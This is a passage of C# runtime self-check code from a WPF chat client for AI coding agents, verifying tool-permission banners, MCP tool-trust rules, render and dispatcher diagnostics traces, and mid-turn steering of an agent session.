            // The engine's own answer reached the panel. A hand-built DTO cannot prove this; only a
            // value that originated on the far side of the hop can.
            var crossed = program == "fake-agent 1.0"
                && conversation == "fake-conv-1";

            // The three states survived the wire distinctly: offered, refused, and never mentioned.
            var triState = negotiated is not null
                && negotiated.Contains("resume", StringComparison.Ordinal)
                && negotiated.Contains("no images", StringComparison.Ordinal)
                && !negotiated.Contains("conversation list", StringComparison.Ordinal);

            // Panel and gate may differ in exactly one direction. The panel saying a capability is
            // absent while the gate has it on is the failure that would mean two sources of truth.
            var agreesWithGate = !(vm.CanSteer && negotiated?.Contains("no mid-turn messages", StringComparison.Ordinal) == true);

            var copies = copy.Contains("fake-agent 1.0", StringComparison.Ordinal)
                && copy.Contains("Backend:", StringComparison.Ordinal);

            var ok = crossed && triState && agreesWithGate && copies;
            return (ok,
                $"program={program} negotiated={negotiated} conv={conversation} " +
                $"crossed={crossed} triState={triState} agreesWithGate={agreesWithGate} copies={copies}");
        }

        // Tool-trust proof (issue #129): an MCP tool request has no command and no path, so its "always
        // allow" used to resolve straight to a session-only memory and the durable option was
        // unreachable. It must now open the same second step the globs get — carrying the persist
        // checkbox, naming the tool as the canonical server/tool rule that will be SAVED, and refusing
        // to let that name be edited (a tool rule matches exactly; an edited name matches nothing).
        // The decision must carry the tool.
        // A tool belonging to ANOTHER MCP server gets the same step, but named with its SERVER — the
        // banner must never hide whose tool is being trusted, and the rule it saves must not be
        // confusable with one of ours by the same bare name.
        private static async Task<(bool ok, string detail)> VerifyToolTrustBannerAsync(ChatViewModel vm)
        {
            static PermissionOptionDto[] Options() => new[]
            {
                new PermissionOptionDto("allow_once", "Allow", "AllowOnce"),
                new PermissionOptionDto("allow_always", "Allow always", "AllowAlways"),
                new PermissionOptionDto("reject_once", "Deny", "RejectOnce"),
            };

            // Kiro's shape for one of ours: the namespaced name in the title AND in ToolName, no kind,
            // no command, no path (captured live — see issue #129).
            const string ours = "@code-wicket/build_solution";
            var task = vm.RequestPermissionAsync(new PermissionRequestDto(
                "tt1", ours, null, null, null, Options(), ToolName: ours));

            var banner = vm.PendingPermission;
            var scoped = banner?.HasToolScope == true;

            banner?.Options.FirstOrDefault(o => string.Equals(o.Kind, "AllowAlways", StringComparison.OrdinalIgnoreCase))
                ?.Command.Execute(null);
            var enteredStep = banner?.IsEditingAlways == true && !task.IsCompleted;
            var namedTool = banner?.Pattern == "code-wicket/build_solution"
                && banner.AlwaysLabel.IndexOf("tool", StringComparison.OrdinalIgnoreCase) >= 0;
            var readOnly = banner?.IsPatternReadOnly == true;
            var offersPersist = banner?.CanPersist == true;

            if (banner is not null)
                banner.PersistRemembered = true;
            banner?.ConfirmAlwaysCommand.Execute(null);
            for (var i = 0; i < 20 && !task.IsCompleted; i++)
                await Task.Delay(25).ConfigureAwait(true);
            var decision = task.IsCompleted ? await task.ConfigureAwait(true) : null;
            var carried = decision is { RememberTool: ours, PersistRemembered: true }
                && decision.RememberCommand is null && decision.RememberPath is null;

            // A foreign server's tool: the step too, but the name it shows keeps the server.
            const string foreign = "@some-other-server/build_solution";
            var foreignTask = vm.RequestPermissionAsync(new PermissionRequestDto(
                "tt2", foreign, null, null, null, Options(), ToolName: foreign));
            var foreignBanner = vm.PendingPermission;
            foreignBanner?.Options.FirstOrDefault(o => string.Equals(o.Kind, "AllowAlways", StringComparison.OrdinalIgnoreCase))
                ?.Command.Execute(null);
            var foreignNamed = foreignBanner?.HasToolScope == true
                && foreignBanner.IsEditingAlways
                && foreignBanner.Pattern == "some-other-server/build_solution";
            foreignBanner?.ConfirmAlwaysCommand.Execute(null);
            for (var i = 0; i < 20 && !foreignTask.IsCompleted; i++)
                await Task.Delay(25).ConfigureAwait(true);
            var foreignCarried = foreignTask.IsCompleted
                && (await foreignTask.ConfigureAwait(true)).RememberTool == foreign;

            var ok = scoped && enteredStep && namedTool && readOnly && offersPersist && carried
                && foreignNamed && foreignCarried;
            return (ok, $"scoped={scoped} step={enteredStep} named={namedTool} (pattern={banner?.Pattern}, "
                + $"label={banner?.AlwaysLabel}) readOnly={readOnly} persistOffered={offersPersist} "
                + $"carried={carried} (tool={decision?.RememberTool}, persist={decision?.PersistRemembered}) "
                + $"foreignNamed={foreignNamed} (pattern={foreignBanner?.Pattern}) foreignCarried={foreignCarried}");
        }

        // Permission-highlight proof: while a prompt is up, its transcript row gets an accent outline and
        // (for a tool row with detail) expands so the user sees which entry they're approving; dismissing
        // reverts both. Fires a synthetic request whose toolCallId matches the existing r1 read row (must
        // run with the auto-allow handler detached so we control the resolve timing). On the dispatcher,
        // so the setter's highlight update has run by the time RequestPermissionAsync returns.
        private static async Task<(bool ok, string detail)> VerifyPermissionHighlightAsync(ChatViewModel vm)
        {
            var row = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "r1");
            if (row is null)
                return (false, "r1 row missing");

            var wasExpanded = row.IsExpanded; // collapsed by default; we expect the prompt to force it open

            var task = vm.RequestPermissionAsync(new PermissionRequestDto(
                "r1", "Reading notes.txt", "read", "read notes", null,
                new[] { new PermissionOptionDto("allow_once", "Allow", "AllowOnce") }));

            var highlightedOnShow = row.IsHighlighted && row.IsExpanded;

            (vm.PendingPermission?.Options.FirstOrDefault())?.Command.Execute(null);
            await task.ConfigureAwait(true);

            var revertedOnDismiss = !row.IsHighlighted && row.IsExpanded == wasExpanded;

            var ok = highlightedOnShow && revertedOnDismiss;
            return (ok, $"highlighted={highlightedOnShow} reverted={revertedOnDismiss}");
        }

        // Edit-banner proof: an edit prompt shows NO raw JSON in its body, surfaces the agent's intent,
        // and offers a "View diff" that opens the native diff — wired from the correlated transcript row
        // (t1, the folded edit tool row from the main turn) via ResolveEditBannerContext. Runs with the
        // auto-allow handler detached so we can inspect the banner before resolving.
        private async Task<(bool ok, string detail)> VerifyEditBannerContextAsync(ChatViewModel vm)
        {
            _lastDiffOpened = null;
            var detailJson = System.Text.Json.JsonSerializer.Serialize(new
            {
                __tool_use_purpose = "Tidy the file",
                command = "strReplace",
                path = "notes.txt",
            });

            var task = vm.RequestPermissionAsync(new PermissionRequestDto(
                "t1", "Editing notes.txt", "edit", detailJson, null,
                new[] { new PermissionOptionDto("allow_once", "Allow", "AllowOnce") },
                Path: "notes.txt"));

            var banner = vm.PendingPermission;
            var noRawJson = banner?.DisplayDetail is null;                          // raw rawInput not dumped
            var gotIntent = banner is { HasIntent: true } && banner.Intent == "Tidy the file";
            var gotViewDiff = banner is { CanViewDiff: true };
            banner?.ViewDiffCommand?.Execute(null);                                 // opens the native diff
            var opened = _lastDiffOpened == "notes.txt";

            (banner?.Options.FirstOrDefault())?.Command.Execute(null);
            await task.ConfigureAwait(true);

            var ok = noRawJson && gotIntent && gotViewDiff && opened;
            return (ok, $"noJson={noRawJson} intent={banner?.Intent} viewDiff={gotViewDiff} opened={_lastDiffOpened}");
        }

        /// <summary>Deliberately slow, and a NAMED method so the trace has something to resolve.</summary>
        private static void BurnDispatcherTime()
        {
            var until = Stopwatch.StartNew();
            while (until.Elapsed.TotalMilliseconds < 8)
            {
                // Spin: a Sleep would leave the dispatcher idle, which is the opposite of the point.
            }
        }

        /// <summary>
        /// The <c>[dispatch]</c> trace (issue #86) fires, and — the part that cannot be assumed — this
        /// runtime lets it name a callback.
        /// </summary>
        /// <remarks>
        /// <para>
        /// <b>The naming path reads a PRIVATE field of <c>DispatcherOperation</c>, and this project
        /// ships two runtimes.</b> <c>_method</c> is not API; if net472's WPF and net10's disagree about
        /// it, or a future one renames it, the trace silently degrades to priorities alone — still
        /// useful, but no longer able to answer the question it was built for. Nothing offline can tell,
        /// because the arithmetic tests hand the name in as a string. So this asserts a real posted
        /// operation comes back NAMED, and it runs on both framework slices (issue #106's reason).
        /// </para>
        /// <para>
        /// The other three moving parts fail silently too: hooks never subscribed, self-time never
        /// resolving a frame, the flush timer never closing an episode. Each writes an empty log while
        /// every unit test passes.
        /// </para>
        /// </remarks>
        private async Task<(bool Ok, string Detail)> VerifyDispatcherTraceAsync(ChatViewModel vm, Window window)
        {
            var lines = new List<string>();
            var previous = RenderDiagnosticsLog.Sink;
            RenderDiagnosticsLog.Sink = line => { lock (lines) lines.Add(line); };
            // Lowered so an ordinary render pass in a standalone host clears the bar — see the field's
            // own remarks. Restored in the finally, or every later run would log a line per frame.
            var previousPassMs = RealisationsSinceRender.ReportPassMs;
            RealisationsSinceRender.ReportPassMs = 0.05;
            // Nothing carried in from an earlier phase, so what this check reports is what this check
            // caused. Without it the assertion could be satisfied by the [realise] check's leftovers,
            // which is exactly the accident being fixed.
            RealisationsSinceRender.Reset();
            DispatcherTrace.Install(window.Dispatcher);
            try
            {
                // Realisations have to happen INSIDE the traced window, and this is the whole repair.
                // The check used to assert realised>0 against whatever the [realise] phase had left in
                // the counter — but every render pass drains it and only passes over ReportPassMs write
                // a line, so a cheap pass slipping in between discarded them and the reported pass
                // honestly said realised=0. Measured: 4 consecutive failures, then 12 consecutive passes,
                // same commit, according to nothing but timing. (The discard itself is fixed in
                // RealisationsSinceRender — a cheap pass now carries forward — but a check must not
                // depend on another phase's residue to begin with.)
                //
                // Fresh items for the reason the [realise] check brings its own: a container is prepared
                // when the panel first realises it, so walking a transcript that already has containers
                // prepares nothing.
                if (window.Content is CodeWicket.UI.Views.ChatView chat)
                {
                    for (var i = 0; i < 12; i++)
                        vm.Items.Add(new MessageItemViewModel(
                            MessageRole.Assistant,
                            $"Dispatch-trace filler {i}, long enough to take a line of its own."));
                    window.UpdateLayout();
                    foreach (var item in vm.Items.ToArray())
                        chat.BringItemIntoView(item);
                }

                // Make sure there IS a render pass to catch: the trace only reports passes, and a window
                // with nothing dirty does not run one.
                window.InvalidateVisual();
                window.UpdateLayout();
                // Comfortably past MinOperations, with a handful slow enough to be worth naming.
                for (var i = 0; i < DispatcherActivity.MinOperations + 10; i++)
                {
                    if (i % 6 == 0)
                        await window.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Render, new Action(BurnDispatcherTime));
                    else
                        await window.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, new Action(() => { }));
                }

                // Long enough for the WINDOW to close, not just for the dispatcher to go quiet — because
                // it cannot go quiet while this is watching. Every `await Task.Delay` continuation is
                // itself a dispatcher operation, so the poll refreshes the very idle clock it is waiting
                // on: the same shape as the flush timer's own tick, one level up. The idle path is
                // therefore unreachable from here by construction and MaxEpisodeMs is what delivers, so
                // the deadline has to cover it. (EpisodeGapMs * 2 + 1000 alone lands exactly on the
                // window boundary: it passes only while ambient dispatcher traffic nudges the episode
                // over, and without that traffic it was measured failing four runs out of four.)
                var deadline = DateTime.UtcNow + TimeSpan.FromMilliseconds(
                    DispatcherActivity.MaxEpisodeMs + DispatcherActivity.EpisodeGapMs * 2 + 1000);
                while (DateTime.UtcNow < deadline)
                {
                    lock (lines)
                        if (lines.Any(l => l.StartsWith("[dispatch]", StringComparison.Ordinal)))
                            break;
                    await Task.Delay(100).ConfigureAwait(true);
                }

                var drained = RenderDiagnosticsLog.Flush(10_000);
                string[] written;
                lock (lines)
                    written = lines.ToArray();

                var dispatch = written.FirstOrDefault(l => l.StartsWith("[dispatch]", StringComparison.Ordinal));
                // A render pass over the threshold must also produce its own line, and it must carry the
                // realisation summary. Nothing offline can check that pairing: it needs a real render
                // pass, which needs a real dispatcher, and the callback-name match that routes it is the
                // same reflection the runtime could stop supporting.
                // Any pass that CARRIED realisations, not merely the first pass: a line reading
                // realised=0 would still satisfy a presence check while the counter was never fed, which
                // is the wiring most likely to be dropped.
                var passes = written.Where(l => l.StartsWith("[render-pass]", StringComparison.Ordinal)).ToArray();
                // A pass that ACCOUNTED for realisations, whether it saw them itself or was handed them by
                // a cheap pass that could not write a line of its own. Those are the same fact for this
                // check — the realisations reached a line rather than being dropped — and accepting only
                // the first spelling is what made it timing-dependent.
                var pass = passes.FirstOrDefault(l => Field(l, "realised=") > 0 || Field(l, "carried=") > 0)
                    ?? passes.FirstOrDefault();
                var realisedTotal = Field(pass, "realised=") + Math.Max(0, Field(pass, "carried="));
                var ops = Field(dispatch, "ops=");
                var busy = Field(dispatch, "busy=");
                var duty = Field(dispatch, "duty=");

                var ok = drained
                    && dispatch is not null
                    && ops >= DispatcherActivity.MinOperations
                    && busy > 0
                    // Self-time can never exceed the wall; over 100% would mean nested operations are
                    // being charged twice, the impossible number this was designed to pre-empt.
                    && duty <= 101
                    && dispatch.Contains("byPriority=")
                    // The runtime-dependent half: our own named method came back through reflection.
                    && dispatch.Contains("App.BurnDispatcherTime")
                    // And a render pass reported itself with its realisation summary attached.
                    && pass is not null
                    && realisedTotal > 0
                    && pass.Contains("maxMeasure=");

                return (ok,
                    $"lines={written.Length}, drained={drained}, ops={ops}, busy={busy}ms, duty={duty}%, "
                    + $"pass={pass ?? "none"}, realisedTotal={realisedTotal}, named={dispatch?.Contains("App.BurnDispatcherTime")}, hooks=(started={DispatcherTrace.StartedCount} completed={DispatcherTrace.CompletedCount} noted={DispatcherTrace.NotedCount}), dispatch={dispatch ?? "none"}");
            }
            finally
            {
                DispatcherTrace.Uninstall();
                RealisationsSinceRender.ReportPassMs = previousPassMs;
                RenderDiagnosticsLog.Sink = previous;
            }

            static double Field(string? line, string key)
            {
                if (line is null)
                    return -1;
                var at = line.IndexOf(key, StringComparison.Ordinal);
                if (at < 0)
                    return -1;
                var from = at + key.Length;
                var to = from;
                while (to < line.Length && (char.IsDigit(line[to]) || line[to] == '.' || line[to] == '-'))
                    to++;
                return double.TryParse(
                    line.Substring(from, to - from),
                    System.Globalization.NumberStyles.Float,
                    System.Globalization.CultureInfo.InvariantCulture,
                    out var value)
                    ? value
                    : -1;
            }
        }

        /// <summary>
        /// The <c>[realise]</c> trace (issue #86) actually fires for a real scroll, and an assistant
        /// message does not build the plain-text control it never shows.
        /// </summary>
        /// <remarks>
        /// <para>
        /// <b>Two mechanism checks in one gesture, both invisible to every offline test.</b>
        /// <c>RealisationCostTests</c> pins what the numbers mean once something calls the accumulator;
        /// it cannot know whether anything does. The transcript being a plain <c>ItemsControl</c> again,
        /// a container that is not a <c>TranscriptItemContainer</c>, a flush timer that never closes an
        /// episode — each writes an EMPTY log while the arithmetic stays green, which is issue #118's
        /// shape and the reason this exists rather than another unit test.
        /// </para>
        /// <para>
        /// The second half is the <c>SelectableEmojiText</c> waste. Its text binding moved into a
        /// trigger so it is only set on messages this control actually shows; re-adding it as a local
        /// value would restore the cost and break nothing that anyone could see, because the control is
        /// <c>Collapsed</c> on the messages it was wasting work on. So the assertion is on the assistant
        /// side — that the text was never SET — with the user side as its control, without which the
        /// check would also pass on a build where the trigger simply never fires.
        /// </para>
        /// </remarks>
        private async Task<(bool Ok, string Detail)> VerifyRealisationLogAsync(ChatViewModel vm, Window window)
        {
            if (window.Content is not CodeWicket.UI.Views.ChatView view)
                return (false, "no ChatView");

            var lines = new List<string>();
            var previous = RenderDiagnosticsLog.Sink;
            RenderDiagnosticsLog.Sink = line => { lock (lines) lines.Add(line); };
            try
            {
                // The check brings its OWN items, and that is not tidiness. A container is prepared when
                // the panel first realises it, so by this point in the run every item on screen has one
                // already and walking the existing transcript prepares nothing — a check that does
                // that reports an empty log, which is indistinguishable from
                // the trace being broken. Fresh items are the only way to guarantee the seam is crossed.
                var probes = new List<MessageItemViewModel>
                {
                    new MessageItemViewModel(MessageRole.User, "A user message, which the plain-text control shows."),
                    new MessageItemViewModel(MessageRole.Assistant, "An assistant message with `code`, whose plain-text twin must stay empty."),
                };
                foreach (var probe in probes)
                    vm.Items.Add(probe);
                // Enough filler to be sure the panel virtualises and recycles rather than realising the
                // lot and never coming back.
                for (var i = 0; i < 30; i++)
                    vm.Items.Add(new MessageItemViewModel(MessageRole.Assistant, $"Filler {i} for the realisation trace, long enough to take a line of its own."));
                window.UpdateLayout();

                // A real traversal: each call asks the virtualising panel to realise an item it has no
                // container for, which is the path a drag takes. Driving the panel rather than
                // synthesising realisations is the whole point — a synthesised one would exercise the
                // accumulator and not the seam.
                // Read WHILE REALISED, never afterwards. A captured control is recycled onto later items
                // as the walk continues, so its Text reverts when the trigger stops applying — reading
                // it at the end reports the state of whatever message it ended up showing, which cost
                // one run of this check to learn.
                string? assistantPlainText = null;
                string? userPlainText = null;
                var sawAssistantPlain = false;
                var sawUserPlain = false;
                foreach (var item in vm.Items.ToArray())
                {
                    var container = view.BringItemIntoView(item);
                    if (container is null || item is not MessageItemViewModel message)
                        continue;

                    var plain = FindDescendantOfType<CodeWicket.UI.Controls.SelectableEmojiText>(container, _ => true);
                    if (plain is null)
                        continue;
                    if (message.IsAssistant && !sawAssistantPlain)
                    {
                        sawAssistantPlain = true;
                        assistantPlainText = plain.Text;
                    }
                    else if (!message.IsAssistant && !string.IsNullOrEmpty(message.Text) && !sawUserPlain)
                    {
                        sawUserPlain = true;
                        userPlainText = plain.Text;
                    }
                }

                // The episode closes on silence and nothing else, so this wait IS part of what is tested.
                var deadline = DateTime.UtcNow
                    + TimeSpan.FromMilliseconds(RealisationCost.EpisodeGapMs * 2 + 1000);
                while (DateTime.UtcNow < deadline)
                {
                    lock (lines)
                        if (lines.Any(l => l.StartsWith("[realise]", StringComparison.Ordinal)))
                            break;
                    await Task.Delay(100).ConfigureAwait(true);
                }

                var drained = RenderDiagnosticsLog.Flush(10_000);
                string[] written;
                lock (lines)
                    written = lines.ToArray();

                var realise = written.FirstOrDefault(l => l.StartsWith("[realise]", StringComparison.Ordinal));

                // Present is not enough: a line reporting items=0 or no layout at all would mean the
                // trace runs and measures nothing, the failure that looks most like success.
                var items = Field(realise, "items=");
                var measures = Field(realise, "measures=");
                var layout = Field(realise, "layoutTotal=");
                var kinds = realise is not null && realise.Contains("kinds=Message");

                // The waste fix. Text never set on the control the assistant message hides; set on the
                // one the user message shows — and the second half is the control, without which this
                // would also pass on a build where the trigger simply never fires.
                var plainTextScoped = sawAssistantPlain
                    && string.IsNullOrEmpty(assistantPlainText)
                    && sawUserPlain
                    && !string.IsNullOrEmpty(userPlainText);

                var ok = drained
                    && realise is not null
                    && items >= RealisationCost.MinRealisations
                    && measures > 0
                    && layout > 0
                    && kinds
                    && plainTextScoped;

                return (ok,
                    $"lines={written.Length}, drained={drained}, items={items}, measures={measures}, "
                    + $"layout={layout}ms, kindsNamed={kinds}, plainTextScoped={plainTextScoped} "
                    + $"(assistant={(sawAssistantPlain ? "'" + assistantPlainText + "'" : "no control")}, "
                    + $"user={(sawUserPlain ? "len " + userPlainText!.Length : "no control")}), "
                    + $"realise={realise ?? "none"}");
            }
            finally
            {
                RenderDiagnosticsLog.Sink = previous;
            }

            static double Field(string? line, string key)
            {
                if (line is null)
                    return -1;
                var at = line.IndexOf(key, StringComparison.Ordinal);
                if (at < 0)
                    return -1;
                var from = at + key.Length;
                var to = from;
                while (to < line.Length && (char.IsDigit(line[to]) || line[to] == '.' || line[to] == '-'))
                    to++;
                return double.TryParse(
                    line.Substring(from, to - from),
                    System.Globalization.NumberStyles.Float,
                    System.Globalization.CultureInfo.InvariantCulture,
                    out var value)
                    ? value
                    : -1;
            }
        }

        /// <summary>
        /// The <c>[md-cost]</c> render-cost trace (issue #86) actually fires for a streamed message.
        /// </summary>
        /// <remarks>
        /// <para>
        /// <b>The arithmetic is unit-tested; this checks the MECHANISM, which no offline test can
        /// reach.</b> Three of the four moving parts live in WPF and would each fail silently: the sink
        /// never being consulted from the render path, the <c>frame</c> probe never running (a callback
        /// posted below <c>Render</c> — if that priority were wrong it would simply measure nothing), and
        /// the idle timer never closing the episode, which is the only thing that ever writes a line.
        /// A build with any of those broken produces an empty log and passes everything else.
        /// This is the #118 shape: a self-check asserting the arithmetic of a paste that WPF never
        /// raised.
        /// </para>
        /// <para>
        /// Deltas are spaced over the 100ms throttle so the renders are real throttled rebuilds rather
        /// than one synchronous first paint, and the message is streamed into the live transcript so the
        /// viewer is the recycled, attached one the feature has to work on.
        /// </para>
        /// </remarks>
        private async Task<(bool Ok, string Detail)> VerifyRenderCostLogAsync(ChatViewModel vm, Window window)
        {
            var lines = new List<string>();
            var previous = RenderDiagnosticsLog.Sink;
            RenderDiagnosticsLog.Sink = line => { lock (lines) lines.Add(line); };
            try
            {
                var item = new MessageItemViewModel(MessageRole.Assistant, "Measuring the render cost. ");
                vm.Items.Add(item);
                window.UpdateLayout();

                // 8 deltas at 130ms — above MinRenderInterval (100ms), below the 150ms synchronous
                // escape, i.e. the ordinary throttled streaming path.
                for (var i = 0; i < 8; i++)
                {
                    item.Append($"Delta {i} with **markdown** and a `span`, long enough to reflow. ");
                    await Task.Delay(130).ConfigureAwait(true);
                }

                // The episode closes on silence and nothing else, so this wait IS the thing under test.
                var deadline = DateTime.UtcNow
                    + TimeSpan.FromMilliseconds(MarkdownRenderCost.EpisodeGapMs * 2 + 1000);
                while (DateTime.UtcNow < deadline)
                {
                    lock (lines)
                        if (lines.Any(l => l.StartsWith("[md-cost]", StringComparison.Ordinal)))
                            break;
                    await Task.Delay(100).ConfigureAwait(true);
                }

                // Lines are written on a pool thread, so drain before reading — which also exercises the
                // drain the hosts depend on at teardown to not lose the last message's line.
                var drained = RenderDiagnosticsLog.Flush(10_000);

                string[] written;
                lock (lines)
                    written = lines.ToArray();

                var env = written.FirstOrDefault(l => l.StartsWith("[render-env]", StringComparison.Ordinal));
                var cost = written.FirstOrDefault(l => l.StartsWith("[md-cost]", StringComparison.Ordinal));

                // The numbers have to be plausible, not just present: a line reporting renders=1 or a
                // duty of 0 would mean the trace runs and measures nothing, which is the failure mode
                // that looks most like success.
                var renders = Field(cost, "renders=");
                var frames = Field(cost, "frames=");
                var wall = Field(cost, "wall=");
                var ok = drained
                    && env is not null
                    && cost is not null
                    && renders >= MarkdownRenderCost.MinRenders
                    // The post-layout probe ran for at least some of them (see the remarks).
                    && frames > 0
                    && wall > 0
                    && Field(cost, "buildTotal=") > 0;

                return (ok,
                    $"lines={written.Length}, drained={drained}, env={(env is null ? "none" : "yes")}, "
                    + $"renders={renders}, frames={frames}, wall={wall}ms, cost={cost ?? "none"}");
            }
            finally
            {
                RenderDiagnosticsLog.Sink = previous;
            }

            // Reads one numeric field out of the line, so the check tests the log a reader would grep
            // rather than a value handed straight back from the accumulator.
            static double Field(string? line, string key)
            {
                if (line is null)
                    return -1;
                var at = line.IndexOf(key, StringComparison.Ordinal);
                if (at < 0)
                    return -1;
                var value = line.Substring(at + key.Length);
                var end = value.IndexOf(' ');
                if (end >= 0)
                    value = value.Substring(0, end);
                return double.TryParse(value.TrimEnd('%'), NumberStyles.Float, CultureInfo.InvariantCulture, out var parsed)
                    ? parsed
                    : -1;
            }
        }

        /// <summary>
        /// Mid-turn steering (issue #70): a message typed while the agent is working reaches it without
        /// the turn being cancelled. Two things are checked, and the first is the one that would
        /// regress silently — <em>Enter has to be live mid-turn at all</em>. It used to be a dead key
        /// (the send command is gated on !IsBusy, and the handler swallowed the keystroke anyway), so a
        /// steer path that works but is unreachable from the keyboard would look identical to a user.
        /// <para>
        /// The second is the race: a steer that arrives just as the turn ends makes the backend run a
        /// turn we never prompted for, whose output has no turn channel of ours to arrive on. That path
        /// crosses the real engine IPC here (fake session → out-of-turn sink → shell/onAgentEvent →
        /// transcript), which is the part unit tests can't reach.
        /// </para>
        /// </summary>
        private async Task<(bool Ok, string Detail)> VerifySteeringAsync(string workDir, string modeName)
        {
            var vm = new ChatViewModel(
                _engine!, new StartSessionRequest("fake", null, workDir, modeName, null),
                sessionStore: new FileSessionStore(Path.Combine(workDir, "sessions", "steer-proof")));
            await vm.InitializeAsync().ConfigureAwait(true);

            // The working bar (and the Stop it now carries) data-binds IsAgentWorking, which is derived
            // from IsBusy and IsAgentWorkingOutOfTurn — so both have to announce it. Watched across the
            // plain opening turn, where only IsBusy moves, because that is the half that had no raise:
            // its other consumers are commands, refreshed explicitly, so nothing noticed until a binding
            // depended on it and the bar simply never appeared. A binding that never updates throws
            // nothing and logs nothing; the only symptom is an absence on screen.
            var announcedWorking = false;
            vm.PropertyChanged += (_, e) =>
            {
                if (e.PropertyName == nameof(ChatViewModel.IsAgentWorking))
                    announcedWorking = true;
            };

            // A first turn, purely to open the session: until one is live there is nothing to steer, so
            // CanSteer is correctly false on a view-model that has never sent.
            vm.InputText = "first, do the thing";
            vm.SendCommand.Execute(null);
            if (!await WaitUntilIdleAsync(vm, TimeSpan.FromSeconds(30)).ConfigureAwait(true))
                return (false, "the opening turn never completed");

            var announcedWorkingOnPlainTurn = announcedWorking;

            // Whether the out-of-turn window was already open the instant the steer was dispatched, for
            // every steer this proof makes. Accumulated rather than overwritten: one late arming is the
            // bug, wherever it happens.
            var armedBeforeRoundTrip = true;

            async Task<(bool Ok, string Detail)> SteerDuringATurnAsync(string text)
            {
                vm.InputText = string.Empty;
                vm.SendCommand.Execute(null); // no text: does nothing, keeps the box clean
                // "[slow-reply]": the fake holds this turn open after its first delta until a steer
                // arrives. Without it the whole reply streams inside one dispatcher tick and the poll
                // below wakes to a finished turn (measured: busy=False on both TFMs).
                vm.InputText = "[slow-reply] second, do the other thing";
                vm.SendCommand.Execute(null);

                // IsBusy is set before SendCoreAsync's first await, so the turn is live as soon as
                // Execute returns — but a steer is only the right shape once the turn has begun its
                // reply (issue #273: one released before the first content frame kills the turn, and
                // the tray holds a promotion until that frame). The fake replies at once, so the wait
                // is one IPC round-trip; IsAgentTyping is "busy with no bubble streaming", which is
                // exactly the pre-content window.
                for (var i = 0; i < 400 && !(vm.IsBusy && vm.CanSteer && !vm.IsAgentTyping); i++)
                    await Task.Delay(5).ConfigureAwait(true);

                if (!vm.IsBusy || !vm.CanSteer || vm.IsAgentTyping)
                    return (false, $"no steerable window: busy={vm.IsBusy} canSteer={vm.CanSteer} replying={!vm.IsAgentTyping}");

                // The UX claim: with the agent working and text in the box, Enter is live.
                vm.InputText = text;
                if (!vm.SendCommand.CanExecute(null))
                    return (false, "send command still disabled mid-turn, so Enter would do nothing");

                // Ctrl+Enter, not Enter: plain Enter now queues for the turn's END, so it cannot be
                // relied on to put a steer on the wire at a chosen instant. Ctrl+Enter promotes the tray
                // to Steer, and with the reply streaming and no tool call open the next safe point is
                // NOW — so the steer goes out inline, which is what this proof needs.
                // VerifyHeldMessagesAsync covers the holding half.
                if (!vm.SteerCommand.CanExecute(null))
                    return (false, "send-now disabled mid-turn, so Ctrl+Enter would do nothing");

                vm.SteerCommand.Execute(null);

                // Read SYNCHRONOUSLY, with no await between this and Execute — that is the entire check.
                // SendAsync runs inline as far as SteerCoreAsync's first await (the steer request itself),
                // so the working window is open here if and only if it was armed BEFORE the request went
                // out. Arm it in reaction to the response instead and this is necessarily false, because
                // the response cannot have arrived yet.
                //
                // A poll would pass either way — the window does open in both versions, just later — and
                // that is exactly how the gap stayed invisible: the pre-empted turn closes on its own
                // response, on a different channel with no ordering against this one, so whenever it won
                // the race the pane went idle mid-steer (dots off, Stop gone, pickers unlocked) for the
                // length of the round-trip while the agent was still working.
                armedBeforeRoundTrip &= vm.IsAgentWorkingOutOfTurn;

                if (!await WaitUntilIdleAsync(vm, TimeSpan.FromSeconds(30)).ConfigureAwait(true))
                    return (false, "the steered turn never completed");

                return (true, string.Empty);
            }

            var (injectedOk, injectedDetail) = await SteerDuringATurnAsync("actually, use the other file").ConfigureAwait(true);
            if (!injectedOk)
                return (false, injectedDetail);

            // The fake answers an injected steer inside the turn that was already streaming.
            var gotInjected = vm.Items.OfType<MessageItemViewModel>()
                .Any(m => m.IsAssistant
                          && m.Text.Contains("[steered mid-turn]", StringComparison.Ordinal)
                          && m.Text.Contains("actually, use the other file", StringComparison.Ordinal));
            var gotUserBubble = vm.Items.OfType<MessageItemViewModel>()
                .Any(m => m.IsUser && m.Text == "actually, use the other file");

            // The steered turn has ended, so IsBusy is false — but a steer's real work runs AFTER the
            // turn it pre-empted closes, so the agent may still be editing files right now. Before this,
            // that left Stop disabled (it was gated on IsBusy) with no way to halt it, the pickers
            // unlocked, and New session free to tear the whole thing down. Nothing on the wire says when
            // this ends, so the window is held open by a quiet timer; what is asserted here is that it is
            // open at all the moment the turn closes, which is when the gap used to open.
            var stopStillOffered = !vm.IsBusy && vm.IsAgentWorkingOutOfTurn && vm.StopCommand.CanExecute(null);
            var selectionLocked = !vm.CanChangeSelection;
            var newSessionLocked = !vm.NewSessionCommand.CanExecute(null);

            // And Stop closes it: cancel is session-scoped, so it stops the steered work too, and a
            // window left armed afterwards would have the pane insist the agent is busy with nothing
            // running — the same lie in the other direction.
            vm.StopCommand.Execute(null);
            for (var i = 0; i < 100 && vm.IsAgentWorkingOutOfTurn; i++)
                await Task.Delay(20).ConfigureAwait(true);

            var stopClearedWindow = !vm.IsAgentWorkingOutOfTurn && vm.CanChangeSelection;

            // "[race]" makes the fake report startedNewTurn and push its output through the out-of-turn
            // sink — the path that silently dropped the whole turn before.
            var (racedOk, racedDetail) = await SteerDuringATurnAsync("[race] and run the tests").ConfigureAwait(true);
            if (!racedOk)
                return (false, "race: " + racedDetail);

            for (var i = 0; i < 100 && !RacedTextArrived(); i++)
                await Task.Delay(20).ConfigureAwait(true);

            var gotRaced = RacedTextArrived();
            var gotRaceNotice = vm.Items.OfType<NoticeItemViewModel>()
                .Any(n => n.Text.Contains("running as a new turn", StringComparison.Ordinal));

            bool RacedTextArrived() => vm.Items.OfType<MessageItemViewModel>()
                .Any(m => m.IsAssistant && m.Text.Contains("[steer started a new turn]", StringComparison.Ordinal));

            var ok = gotInjected && gotUserBubble && gotRaced && gotRaceNotice
                && stopStillOffered && selectionLocked && newSessionLocked && stopClearedWindow
                && armedBeforeRoundTrip && announcedWorkingOnPlainTurn;
            return (ok, ok
                ? string.Empty
                : $"injected={gotInjected} userBubble={gotUserBubble} racedOutput={gotRaced} "
